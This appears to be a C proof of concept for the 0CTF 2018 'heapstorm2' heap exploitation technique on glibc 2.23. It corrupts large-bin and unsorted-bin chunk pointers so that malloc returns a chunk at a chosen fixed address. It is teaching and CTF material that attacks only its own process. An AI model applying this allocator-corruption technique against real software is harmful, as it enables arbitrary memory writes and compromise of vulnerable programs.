/*
 * x86_64, glibc-2.23
 * gcc -fpie -pie 0ctf-qual-2018_heapstorm2.c -o 0ctf-qual-2018_heapstorm2
 * large_bin corruption & unsorted_bin corruption
 */

#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <malloc.h>

unsigned long *a, *b, *c;

void write_with_heap_address(unsigned long addr) {
    // put [b] into unsorted_bin
    free(b);

    // modify [a]->bk_nextsize to the target address
    a[3] = addr-0x20;

    // put b into large_bin and the target address will be written with address of [b]
    malloc(0x500);

    // malloc [b]
    b = malloc(0x400);

}

int main(void) {

    mallopt(1, 0);
    mmap((void *)0x13370000, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0);

    a = (unsigned long *)malloc(0x420);
    malloc(0x10);
    b = (unsigned long *)malloc(0x400);
    malloc(0x10);

    // put [a] into unsorted bin
    free(a);

    // put [a] from unsorted_bin into large_bin
    malloc(0x500);

    write_with_heap_address(0x13370038-5); // use 0x56 as chunk size
    write_with_heap_address(0x13370040);
    write_with_heap_address(0x13370048);

    c = malloc(0x600);
    malloc(0x600); // avoid consolidating with top chunk

    // another unsorted_bin chunk under control
    free(c);
    c[1] = 0x13370030;

    // malloc [c]
    malloc(0x600);

    // malloc(0x40) = 0x0x13370030
    unsigned long target = (unsigned long)malloc(0x40);

}
